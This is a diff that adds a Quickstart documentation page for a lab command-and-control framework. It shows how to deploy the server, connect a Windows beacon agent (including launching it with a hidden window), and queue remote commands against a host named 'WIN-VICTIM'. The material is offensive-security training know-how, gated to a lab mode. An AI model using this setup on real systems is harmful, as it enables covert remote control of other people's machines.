@@ -1,0 +1,490 @@
+---
+title: Quickstart
+description: Launch the C2 server and connect your first agent
+---
+
+This guide walks through starting the C2 server and establishing your first agent connection in minutes.
+
+<Warning>
+  Before starting, ensure you've completed:
+  - [Installation](/getting-started/installation) - All dependencies installed
+  - [Lab Setup](/getting-started/lab-setup) - Network configured and certificates generated
+</Warning>
+
+## Choose Deployment Method
+
+The C2 Framework supports two deployment modes:
+
+| Method | Use Case | Complexity | Features |
+|--------|----------|------------|----------|
+| **Bare-Metal** | Development, debugging, testing | Simple | Direct FastAPI/uvicorn, exposed ports |
+| **Docker Compose** | Production-like, reverse proxy testing | Moderate | Nginx frontend, user-agent filtering, isolated network |
+
+## Option 1: Bare-Metal Deployment
+
+### Step 1: Configure for Bare-Metal
+
+Edit `common/config.py`:
+
+```python
+# Network
+SERVER_HOST  = 'c2.lab.internal'
+SERVER_PORT  = 8443  # Direct uvicorn port
+BACKEND_PORT = 8443
+BEHIND_NGINX = False  # Important: Set to False
+```
+
+### Step 2: Start the Server
+
+<Steps>
+  <Step title="Activate Virtual Environment">
+    ```bash
+    cd ~/c2-framework
+    source venv/bin/activate
+    ```
+  </Step>
+  
+  <Step title="Set Lab Mode Environment Variable">
+    ```bash
+    export LAB_MODE=1
+    ```
+    
+    <Note>
+      The server **will not start** without `LAB_MODE=1`. This safety mechanism prevents accidental deployment outside isolated labs.
+    </Note>
+  </Step>
+  
+  <Step title="Launch the Server">
+    ```bash
+    python -m server.server_main
+    ```
+    
+    Expected output:
+    ```
+    INFO:     Started server process [12345]
+    INFO:     Waiting for application startup.
+    INFO:     Application startup complete.
+    INFO:     Uvicorn running on https://0.0.0.0:8443 (Press CTRL+C to quit)
+    ```
+  </Step>
+  
+  <Step title="Verify Server is Running">
+    From another terminal:
+    
+    ```bash
+    # Check listening port
+    ss -tlnp | grep 8443
+    
+    # Test TLS handshake
+    curl -k https://c2.lab.internal:8443/beacon
+    ```
+    
+    You should see a connection, even if it returns an error (agent authentication required).
+  </Step>
+</Steps>
+
+### Step 3: Configure and Run the Agent
+
+<Steps>
+  <Step title="Copy Certificate to Windows VM">
+    On Ubuntu VM:
+    
+    ```bash
+    # Start Python HTTP server to transfer cert
+    cd ~/c2-framework/certs
+    python3 -m http.server 8000
+    ```
+    
+    On Windows VM (PowerShell):
+    
+    ```powershell
+    # Download certificate
+    Invoke-WebRequest -Uri http://192.168.100.10:8000/server.crt -OutFile C:\Users\$env:USERNAME\certs\server.crt
+    
+    # Verify download
+    Get-Content C:\Users\$env:USERNAME\certs\server.crt
+    ```
+    
+    Stop the HTTP server on Ubuntu (Ctrl+C).
+  </Step>
+  
+  <Step title="Update Agent Configuration">
+    On the Windows VM, edit `common/config.py`:
+    
+    ```python
+    # Network
+    SERVER_HOST = 'c2.lab.internal'
+    SERVER_PORT = 8443  # Match server port
+    
+    # TLS
+    TLS_CERT_PATH = r'C:\Users\<username>\certs\server.crt'
+    
+    # Use the same PRE_SHARED_KEY as the server
+    PRE_SHARED_KEY = b'\x8a\x3f...'  # Copy from server config
+    ```
+  </Step>
+  
+  <Step title="Launch the Agent">
+    On Windows VM (PowerShell as **Administrator**):
+    
+    ```powershell
+    cd C:\Users\<username>\c2-framework
+    
+    # Set lab mode
+    $env:LAB_MODE = "1"
+    
+    # Run agent
+    python -m agent.agent_main
+    ```
+    
+    Expected output:
+    ```
+    INFO: Environment checks passed
+    INFO: Beacon interval: 30s (±20% jitter)
+    INFO: Checking in with c2.lab.internal:8443
+    INFO: Checkin successful, session_id: abc123...
+    INFO: Beacon loop started
+    ```
+  </Step>
+</Steps>
+
+### Step 4: Interact with the Agent
+
+<Steps>
+  <Step title="List Active Sessions">
+    On the Ubuntu VM, open a new terminal:
+    
+    ```bash
+    cd ~/c2-framework
+    source venv/bin/activate
+    python -m server.cli sessions
+    ```
+    
+    Example output:
+    ```
+    SESSION_ID          | HOSTNAME    | USERNAME | LAST_SEEN
+    abc123def456789... | WIN-VICTIM  | user     | 2026-03-11 14:32:10
+    ```
+  </Step>
+  
+  <Step title="Queue a Command">
+    ```bash
+    python -m server.cli task add <session_id> "whoami"
+    ```
+    
+    The agent will pull the task on its next beacon (within ~30 seconds).
+  </Step>
+  
+  <Step title="Retrieve Command Results">
+    ```bash
+    python -m server.cli task results <session_id>
+    ```
+    
+    Example output:
+    ```
+    TASK_ID | COMMAND | STATUS    | STDOUT
+    1       | whoami  | completed | WIN-VICTIM\user
+    ```
+  </Step>
+</Steps>
+
+## Option 2: Docker Compose Deployment
+
+### Step 1: Configure for Docker
+
+Edit `common/config.py`:
+
+```python
+# Network
+SERVER_HOST  = 'c2.lab.internal'
+SERVER_PORT  = 443  # Nginx frontend port
+BACKEND_PORT = 8443
+```
+
+<Note>
+  `BEHIND_NGINX` is automatically set via Docker Compose environment variables. No manual config change needed.
+</Note>
+
+### Step 2: Start the Stack
+
+<Steps>
+  <Step title="Build and Launch Containers">
+    ```bash
+    cd ~/c2-framework
+    docker-compose up --build -d
+    ```
+    
+    This builds and starts:
+    - `c2-server` (FastAPI on internal port 8443)
+    - `c2-nginx` (Nginx on host ports 80, 443)
+  </Step>
+  
+  <Step title="Verify Containers are Running">
+    ```bash
+    docker-compose ps
+    ```
+    
+    Expected output:
+    ```
+    NAME        IMAGE            STATUS    PORTS
+    c2-server   c2-server:latest Up        (internal 8443)
+    c2-nginx    c2-nginx:latest  Up        0.0.0.0:80->80/tcp, 0.0.0.0:443->443/tcp
+    ```
+  </Step>
+  
+  <Step title="Check Server Logs">
+    ```bash
+    docker-compose logs -f c2-server
+    ```
+    
+    Look for:
+    ```
+    INFO: server started port=443
+    INFO: Application startup complete
+    ```
+  </Step>
+</Steps>
+
+### Step 3: Run the Agent
+
+Agent configuration is identical to bare-metal, but use **port 443**:
+
+```python
+# common/config.py on Windows VM
+SERVER_HOST = 'c2.lab.internal'
+SERVER_PORT = 443  # Nginx frontend
+```
+
+Launch the agent:
+
+```powershell
+$env:LAB_MODE = "1"
+python -m agent.agent_main
+```
+
+### Step 4: Interact via Docker
+
+<Steps>
+  <Step title="Access CLI Inside Container">
+    ```bash
+    docker-compose exec c2-server python -m server.cli sessions
+    ```
+  </Step>
+  
+  <Step title="Queue Commands">
+    ```bash
+    docker-compose exec c2-server python -m server.cli task add <session_id> "ipconfig /all"
+    ```
+  </Step>
+  
+  <Step title="View Logs and Database">
+    Logs and database persist on the host:
+    
+    ```bash
+    ls -l logs/
+    # c2_server.db - SQLite database
+    # server.log   - Application logs
+    ```
+  </Step>
+</Steps>
+
+## Docker Architecture
+
+The Docker deployment uses an internal network:
+
+```
+Windows VM (192.168.100.20)
+        |
+        | HTTPS :443 (c2.lab.internal)
+        v
+┌───────────────────────────────────────┐
+│ Ubuntu VM (192.168.100.10)            │
+│                                       │
+│  ┌─────────────────────────────────┐ │
+│  │ c2-nginx container              │ │
+│  │ - TLS termination               │ │
+│  │ - User-Agent filtering          │ │
+│  │ - Port 80 → 443 redirect        │ │
+│  └──────────┬──────────────────────┘ │
+│             │                         │
+│             | HTTP :8443              │
+│             | (c2-internal network)   │
+│             v                         │
+│  ┌─────────────────────────────────┐ │
+│  │ c2-server container             │ │
+│  │ - FastAPI application           │ │
+│  │ - Session management            │ │
+│  │ - Command queue                 │ │
+│  └──────────┬──────────────────────┘ │
+│             │                         │
+│             v                         │
+│  logs/c2_server.db (bind mount)     │
+│                                       │
+└───────────────────────────────────────┘
+```
+
+**Key Points**:
+- Port **8443** is **not exposed** to the host - only reachable by Nginx
+- Nginx performs TLS termination and forwards plain HTTP to the backend
+- Agent connects to port **443** (Nginx), not 8443
+- Database and logs persist outside containers via bind mounts
+
+## Common Commands
+
+### Server Management
+
+<CodeGroup>
+```bash Bare-Metal
+# Start server
+export LAB_MODE=1
+python -m server.server_main
+
+# Stop server
+# Press Ctrl+C
+
+# View logs
+tail -f logs/server.log
+
+# Check database
+sqlite3 logs/c2_server.db "SELECT * FROM sessions;"
+```
+
+```bash Docker
+# Start stack
+docker-compose up -d
+
+# Stop stack
+docker-compose down
+
+# View logs
+docker-compose logs -f
+
+# Restart services
+docker-compose restart
+
+# Rebuild after code changes
+docker-compose up --build -d
+```
+</CodeGroup>
+
+### Agent Management
+
+```powershell
+# Start agent
+$env:LAB_MODE = "1"
+python -m agent.agent_main
+
+# Stop agent
+# Press Ctrl+C
+
+# Run in background (optional)
+Start-Process python -ArgumentList "-m", "agent.agent_main" -WindowStyle Hidden
+```
+
+### CLI Operations
+
+```bash
+# List all sessions
+python -m server.cli sessions
+
+# Show session details
+python -m server.cli session <session_id>
+
+# Queue task
+python -m server.cli task add <session_id> "<command>"
+
+# View task results
+python -m server.cli task results <session_id>
+
+# Clear old sessions
+python -m server.cli sessions prune --older-than 7d
+```
+
+## Verification Checklist
+
+After completing the quickstart, verify:
+
+- [ ] Server starts without errors (check logs for `INFO: Application startup complete`)
+- [ ] Agent successfully checks in (look for `session_id` in agent output)
+- [ ] Agent appears in `sessions` command output
+- [ ] Queued task executes within beacon interval
+- [ ] Task results are retrievable via CLI
+- [ ] TLS certificate is pinned correctly (no SSL errors in agent logs)
+- [ ] Database file created: `logs/c2_server.db`
+
+## Next Steps
+
+Now that you have a working C2 setup:
+
+1. **[Architecture](/concepts/architecture)** - Understand the system design
+2. **[Protocol](/concepts/protocol)** - Learn the beacon protocol
+3. **[Server Components](/server/overview)** - Explore server internals
+4. **[Agent Components](/agent/overview)** - Explore agent internals
+5. **[Operational Guide](/operations/managing-sessions)** - Advanced session management
+
+## Troubleshooting
+
+### Server Won't Start
+
+**Error**: `LAB_MODE environment variable not set`
+
+```bash
+# Solution: Export LAB_MODE
+export LAB_MODE=1
+python -m server.server_main
+```
+
+**Error**: `Address already in use`
+
+```bash
+# Check what's using the port
+sudo ss -tlnp | grep 8443
+
+# Kill the process or use a different port
+```
+
+### Agent Can't Connect
+
+**Error**: `SSL: CERTIFICATE_VERIFY_FAILED`
+
+- Verify `TLS_CERT_PATH` points to the correct certificate location
+- Ensure certificate CN matches `SERVER_HOST`
+- Check certificate is not expired: `openssl x509 -in server.crt -noout -dates`
+
+**Error**: `Connection refused`
+
+- Verify server is running: `ss -tlnp | grep 8443` (bare-metal) or `docker-compose ps`
+- Test connectivity: `ping c2.lab.internal`
+- Check Windows firewall isn't blocking outbound connections
+
+**Error**: `Pre-shared key mismatch`
+
+- Ensure `PRE_SHARED_KEY` is identical in server and agent `config.py`
+- Key must be exactly 32 bytes
+
+### Docker Issues
+
+**Error**: `Cannot connect to Docker daemon`
+
+```bash
+# Add user to docker group
+sudo usermod -aG docker $USER
+# Log out and log back in
+```
+
+**Error**: `Port 443 already in use`
+
+```bash
+# Check what's using port 443
+sudo ss -tlnp | grep 443
+
+# Stop conflicting service (e.g., Apache)
+sudo systemctl stop apache2
+```
+
+### No Beacon Activity
+
+- Check beacon interval: Default is 30 seconds (±20% jitter)
+- Verify agent is still running (check Task Manager)
+- Check agent logs for errors
+- Ensure system clock is synchronized between VMs
